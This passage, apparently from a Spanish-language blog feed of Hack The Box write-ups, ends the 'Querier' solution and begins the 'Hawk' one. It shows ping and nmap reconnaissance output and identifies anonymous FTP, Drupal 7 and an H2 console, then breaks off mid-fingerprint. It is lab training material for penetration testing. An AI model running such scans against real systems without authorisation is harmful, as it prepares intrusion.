-&lt;p&gt;Ya somos administradores de la máquina y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="SQL" /><category term="Powershell" /><category term="Injection" /><summary type="html">Resolución de la máquina Querier en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Hawk</title><link href="http://localhost:4000/htb-hawk/" rel="alternate" type="text/html" title="Hack The Box Hawk" /><published>2021-09-16T00:00:00-05:00</published><updated>2021-09-16T00:00:00-05:00</updated><id>http://localhost:4000/htb-hawk</id><content type="html" xml:base="http://localhost:4000/htb-hawk/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-hawk/banner-hawk.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;hawk&quot;&gt;Hawk&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.102.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.102
-PING 10.10.10.102 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.102: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;140 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.102 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 139.690/139.690/139.690/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.102 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 22:18 CDT
-Initiating Ping Scan at 22:18
-Scanning 10.10.10.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 22:18, 0.14s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 22:18
-Scanning 10.10.10.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.102
-Discovered open port 80/tcp on 10.10.10.102
-Discovered open port 21/tcp on 10.10.10.102
-Discovered open port 8082/tcp on 10.10.10.102
-Discovered open port 5435/tcp on 10.10.10.102
-Discovered open port 9092/tcp on 10.10.10.102
-Completed SYN Stealth Scan at 22:19, 47.26s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.102
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65529 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-80/tcp   open  http
-5435/tcp open  sceanics
-8082/tcp open  blackice-alerts
-9092/tcp open  XmlIpcRegSvc
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;47.81 seconds
-           Raw packets sent: 81246 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.575MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 78865 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.155MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.102
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,22,80,5435,8082,9092
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80,5435,8082,9092 10.10.10.102 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted                                                               
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 22:20 CDT                                                                  
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.102                                                                                                
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                      
-                                                                                                                                 
-PORT     STATE SERVICE       VERSION                                                                                             
-21/tcp   open  ftp           vsftpd 3.0.3                                                                                        
-| ftp-syst:                                                                                                                      
-|   STAT:                                                                                                                        
-| FTP server status:                                                                                                             
-|      Connected to ::ffff:10.10.14.2                                                                                            
-|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp                                                                                                          
-|      TYPE: ASCII                                                                                                               
-|      No session bandwidth limit                                                                                                
-|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300                                                                                         
-|      Control connection is plain text                                                                                          
-|      Data connections will be plain text                                                                                       
-|      At session startup, client count was 1                                                                                    
-|      vsFTPd 3.0.3 - secure, fast, stable                                                                                       
-|_End of status                                                                                                                  
-| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                           
-|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages                                                               
-22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                 
-| ssh-hostkey:                                                                                                                   
-|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                   
-|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                  
-|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         
-80/tcp   open  http          Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;                                                                      
-|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp   open  http          Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;                                                                      
-|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                   
-|_http-title: Welcome to 192.168.56.103 | 192.168.56.103                                                                         
-| http-robots.txt: 36 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                              
-| /includes/ /misc/ /modules/ /profiles/ /scripts/                                                                               
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-|_/LICENSE.txt /MAINTAINERS.txt
-|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-5435/tcp open  tcpwrapped
-8082/tcp open  http          H2 database http console
-|_http-title: H2 Console
-9092/tcp open  XmlIpcRegSvc?
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:
-//nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port9092-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.92%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9/16%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;61440966%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NU
-SF:LL,45E,&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0\0\0\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;009&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;000&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;001&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;001&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;007&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:0t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i
-SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:l&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:0h&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;d8&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;o&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;g&lt;span class=&quot;se&quot;&gt;\0\.\0&lt;/span&gt;h&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;002
-SF:&lt;span class=&quot;se&quot;&gt;\0\.\0&lt;/span&gt;j&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;d&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;b&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;c&lt;span class=&quot;se&quot;&gt;\0\.\0&lt;/span&gt;J&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;d&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;b&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;c&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;S&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;Q&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;L&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;E&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;x&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;c&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;p&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;t&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;i&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;o&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;:
-SF:&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;R&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;m&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;o&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;t&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;c&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;o&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;c&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;t&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;i&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;o&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;s&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;
-SF:t&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;o&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;t&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;h&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;i&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;s&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;s&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;v&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-SF:0o&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;t&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;l&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;l&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;o&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;w&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;d&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;s&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;-&lt;span 